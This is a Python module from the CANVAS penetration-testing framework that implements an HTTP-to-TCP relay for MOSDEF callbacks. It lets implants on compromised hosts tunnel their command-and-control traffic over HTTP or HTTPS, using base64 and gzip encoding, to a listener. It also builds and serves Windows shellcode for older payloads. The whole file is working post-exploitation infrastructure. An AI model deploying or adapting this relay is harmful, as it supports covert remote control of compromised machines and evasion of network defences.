#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2009
#http://www.immunityinc.com/CANVAS/ for more information

import sys
import select
import time
import struct
import base64

if '.' not in sys.path:
    sys.path.append('.')

import canvasengine
from ExploitTypes.localcommand import LocalCommand

from exploitutils   import *
from tcpexploit     import tcpexploit
from libs.spkproxy  import header, body, MyConnection

NOTES = """
A HTTP Proxy for MOSDEF TCP Callbacks, this server will manage and relay
HTTP MOSDEF callbacks to a regular TCP MOSDEF listener. This will hugely
simplify (and thus make more robust) the HTTP MOSDEF plumbing.

NOTE: because we're HTTP we basically already get TCP reliability for
free, i.e. we have way less potential for packet loss than the ICMP
implementation, which means we can probably get away with not having
sequencing etc.
"""

NAME                            = 'HTTP Proxy for MOSDEF Callbacks'
DESCRIPTION                     = 'HTTP Proxy for MOSDEF Callbacks'
DOCUMENTATION                   = {}
DOCUMENTATION['Repeatability']  = 'N/A'
DOCUMENTATION['Notes']          = NOTES
VERSION                         = '1.0'

PROPERTY                        = {}
PROPERTY['TYPE']                = 'Servers'


class http_mosdef_client:
    def __init__(self, client_sock, client_addr):
        self.inbuf          = '' # push
        self.outbuf         = '' # pop
        self.mosdef_sock    = None
        self.client_sock    = client_sock
        self.client_addr    = client_addr
        self.client_id      = None
        
    def client_connect(self, mosdef_host, mosdef_port, mosdef_type, mosdef_id):
        ## connect a client to the CANVAS side mosdef listener
        try:
            self.mosdef_sock.connect((mosdef_host, mosdef_port))
            # To let the universal listener know what to do with us ...
            self.mosdef_sock.send(struct.pack('>LL', mosdef_type, mosdef_id))
        except:
            return False    
        return True
    
class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.server_sock    = None
        self.server_port    = 8080
        self.mosdef_port    = 5555
        self.mosdef_host    = '127.0.0.1'
        self.clients        = {}
        self.useSSL         = False
        self.verbose        = False
        
    def listen(self):
        if not self.engine:
            self.engine = canvasengine.canvasengine()    
        s = gettcplistener(self.server_port, listenhost = '0.0.0.0')
        if s:
            s.set_timeout(5)
        return s
    
    # XXX: can't assume mosdef host == proxy host
    def backwards_compatible(self, clientheader, spike_fd):
        self.log("Backwards compatible mode prepping to HTTP MOSDEF back to: %s:%d" % (self.mosdef_host, self.server_port))
        import shellcode.standalone.windows.payloads as payloads
        
        ssl_dict = { True : 'https', False : 'http' }
        p   = payloads.payloads()
        sc  = p.http_proxy(self.mosdef_host, self.mosdef_port, SSL=self.useSSL)
        
        # slap it in a body and send it on it's way
        newbody     = p.assemble(sc)
        newbody     = struct.pack('<L', len(newbody)) + newbody
        servheader  = header('SERVER')
        servbody    = body()
        resp        = ''
        servbody.setBody(newbody)
        if clientheader.cangzip:
            servheader.setcanzip(clientheader)
        bodydata = ''.join(servbody.data)
        if servheader.cangzip:
            bodydata = gzipBuffer(bodydata)
            servheader.addHeader('Content-Encoding', 'gzip') 
        resp += '%s %s %s\r\n' % \
                (servheader.version, servheader.status, servheader.msg)
        for akey in servheader.headerValuesDict.keys():
            if akey.upper() not in [ 'CONTENT-LENGTH' ]:
                resp += servheader.grabHeader(akey)
        resp += 'Content-Length: ' + str( len(bodydata) ) + '\r\n'
        resp += '\r\n'
        resp += ''.join(bodydata)
        try:
            spike_fd.send(resp)
        except socket.error:
            self.log("Connection closed by peer")
            return False
        spike_fd.close()
        return True        
    
    def request_id(self, s):
        devlog('http_proxy', 'Handling incoming HTTP request')
        clientheader = header(state='SERVER')
        devlog('http_proxy', 'Setting header.useSSL to %d' % self.useSSL)
        clientheader.useSSL = self.useSSL
        
        if self.useSSL == True:
            spike_fd    = MyConnection(s, directSSL=True)
            ret         = spike_fd.startSSLserver()
            if ret == False:
                print "XXX: SSL handshake failed."
                return (None, None, None)
        else:           
            spike_fd = s
        ret = clientheader.readdata(spike_fd)
        if not ret:
            self.log("XXX: connection aborted!?")
            return (None, None, None)
        
        if 'X-id' not in clientheader.headerValuesDict:
            print repr(clientheader.headerValuesDict)
            self.log('This is not a _new_ HTTP MOSDEF client ...')
            if clientheader.URL == '/w':
                self.log("Handling old-style payload backwards compatibility");
                self.backwards_compatible(clientheader, spike_fd)
            else:
                self.log('Unknown HTTP client header:')
                print repr(clientheader)
            return (None, None, None)
        
        client_id = clientheader.getStrValue(['X-id'])
                
        return (clientheader, client_id, spike_fd)
        
    def handle_http(self, clientheader, client_id, spike_fd):
        ## handle incoming HTTP
        clientbody = body()
        if clientheader.gotGoodHeader():
            if clientheader.bodySize() > 0 or clientheader.wasChunked:
                clientbody.read(spike_fd, clientheader.bodySize(), clientheader.wasChunked, 0)
        else:
            self.log('Invalid header recved: %s (client: %s)' % \
                     (repr(clientheader.data), client_id))
            return False
               
        if self.verbose:
            self.log("Clientheader URL: %s (peer: %s)" % \
                 (clientheader.URL, client_id))
        
        # POST with an X-type of 'more|last' and an X-mode of 'push' or 'pop'
        
        if 'X-mode' not in clientheader.headerValuesDict:
            self.log('This is not a HTTP MOSDEF client ...')
            return False
        mode = clientheader.getStrValue(['X-mode'])
        
        servheader  = header('SERVER')
        servbody    = body()
        resp        = ''
        
        # force to update cangzip because even when the Accept-Encoding contains gzip it gets here with default values
        clientheader.setcanzip(clientheader)
        encode_base64 = True if clientheader.getStrValue(["Accept-Encoding"]).count("base64") else False
        
        if self.verbose:
            self.log("Client body data: %s" % repr(clientbody.data))
            
        if mode == 'push':
            decode_base64 = True if clientheader.getStrValue(["Content-Encoding"]).count("base64") else False
            
            if 'X-type' not in clientheader.headerValuesDict:
                self.log('This is not a HTTP MOSDEF client ...')
                return False
            x_type = clientheader.getStrValue(['X-type'])
            
            if x_type in ['more', 'last']:
                # decode the body if headers say it is encoded in base64
                body_data = ''.join(clientbody.data)
                if decode_base64:
                    if self.verbose: self.log("Base64 decoding the body = %s" % body_data)
                    body_data = base64.decodestring(body_data)
                
                if self.verbose:
                    self.log("Pushing client data: %r" % body_data)    
                
                self.clients[client_id].inbuf += body_data
                
            if x_type == 'last':
                # packet is done, send it all out to mosdef tcp end  
                ret = self.clients[client_id].mosdef_sock.send(self.clients[client_id].inbuf)
                if ret != len(self.clients[client_id].inbuf):
                    self.log("XXX: push Len/Buf mismatch!")
                self.clients[client_id].inbuf = ''
                
            servbody.setBody('boing')
            
        if mode == 'pop':
            if self.verbose:
                self.log("Popping client data ... HTTP response")
            self.update_outbuf()
            servbody.setBody(self.clients[client_id].outbuf)
            self.clients[client_id].outbuf = ''
            
        if clientheader.cangzip:
            servheader.setcanzip(clientheader)

        bodydata = ''.join(servbody.data)
        
        # encode the body if the client accepts that in order to avoid issues with null bytes on
        # some http clients that might read from string streams (i.e: java HttpURLConnection)
        if encode_base64:
            bodydata = base64.encodestring(bodydata)
            servheader.addHeader('Content-Encoding', 'base64')
            
        if servheader.cangzip:
            bodydata = gzipBuffer(bodydata)
            servheader.addHeader('Content-Encoding', 'gzip, base64' if encode_base64 else "gzip") 

        resp += '%s %s %s\r\n' % \
                    (servheader.version, servheader.status, servheader.msg)
        for akey in servheader.headerValuesDict.keys():
            if akey.upper() not in [ 'CONTENT-LENGTH' ]:
                resp += servheader.grabHeader(akey)
        resp += 'Content-Length: ' + str( len(bodydata) ) + '\r\n'
        resp += '\r\n'
        resp += ''.join(bodydata)
        
        #print "XXX SPIKE RESPONSE: " + repr(resp)
            
        try:
            spike_fd.send(resp)
        except socket.error:
            self.log("Connection closed by peer")
            return False

        spike_fd.close()
        return True
    
    def update_outbuf(self):
        ## walk clients and update output buffers accordingly
        for client_id in self.clients:
            active  = False
            sock    = self.clients[client_id].mosdef_sock 
            if hasattr(sock, 'isactive'):
                if sock.isactive():
                    active = True
            else:
                rd, wr, ex = select.select([sock], [], [], 0)
                if rd:
                    active = True
            if active:
                if self.verbose:
                    self.log("Active mosdef_sock for client: %s" % client_id)
                self.clients[client_id].outbuf += \
                    self.clients[client_id].mosdef_sock.recv(0xffff)
        return
                    
    def accept(self, s, timeout=0.5):
        ## accept and init proxy clients
        s.set_timeout(timeout)
        try:
            (client_sock, client_addr) = s.accept()
        except:
            if self.verbose:
                self.log("Accept timed out ...")
            return None
        # init, connect, and add client ... request id takes care of backwards comp.
        (clientheader, client_id, spike_fd) = self.request_id(client_sock)
        if client_id not in self.clients:
            
            # XXX: parse out the mosdef_type and mosdef_id from the X-id header
            # XXX: the cliend_id string keeps serving us as the unique identifier
            
            self.log('Handling universal client id: %s' % client_id)
            if not client_id:
                self.log("Error: No client_id sent?")
                return None 
            mosdef_type,mosdef_id = client_id.split(',')
            mosdef_type = dInt(mosdef_type)
            mosdef_id = dInt(mosdef_id)
            
            self.log("Got HTTP mosdef_type: 0x%.8x, mosdef_id: 0x%.8x" % (mosdef_type, mosdef_id))
                     
            client              = http_mosdef_client(client_sock, client_addr)
            client.client_id    = client_id
            client.mosdef_sock  = self.gettcpsock()
            if client.client_id:
                self.clients[client.client_id] = client
                if client.client_connect(self.mosdef_host, self.mosdef_port, mosdef_type, mosdef_id) == False:
                    self.log("Could not connect through to MOSDEF TCP listener ...")
                    return False
                self.log("Client (%s) connected to both ends ..." % client.client_id)
        else:
            # update the client sock for the new request!!! (doh)
            self.clients[client_id].client_sock = client_sock
            
        # push through the client header for data handling
        ret = True
        if clientheader and client_id and spike_fd:
            ret = self.handle_http(clientheader, client_id, spike_fd)
            if ret == False:
                    self.log("Removing client (%s)" % client_id)
                    self.clients.pop(client_id)           
        return ret 
                
    def getArgs(self):
        self.useSSL         = bool(int(self.argsDict.get('useSSL', self.useSSL)))
        self.server_port    = int(self.argsDict.get('port', self.server_port))
        self.mosdef_host    = self.argsDict.get('mosdef_host', self.mosdef_host)
        self.mosdef_port    = self.argsDict.get('mosdef_port', self.mosdef_port)

    def shutdown(self):
        try:
            self.server_sock.close()
        except Exception:
            pass

    def run(self):
        self.getArgs()
        self.server_sock = self.listen()
        self.setInfo("Serving HTTP-to-TCP Proxy %d:%s:%d" % (self.server_port,\
                                                             self.mosdef_host,\
                                                             self.mosdef_port))
        while self.server_sock and self.state != self.HALT:
            ret = self.accept(self.server_sock)


        self.shutdown();
        return None
                    
if __name__== '__main__':
    app = theexploit()
    ret = standard_callback_commandline(app)
    if ret not in [0, 1, None]:
        ret.interact()
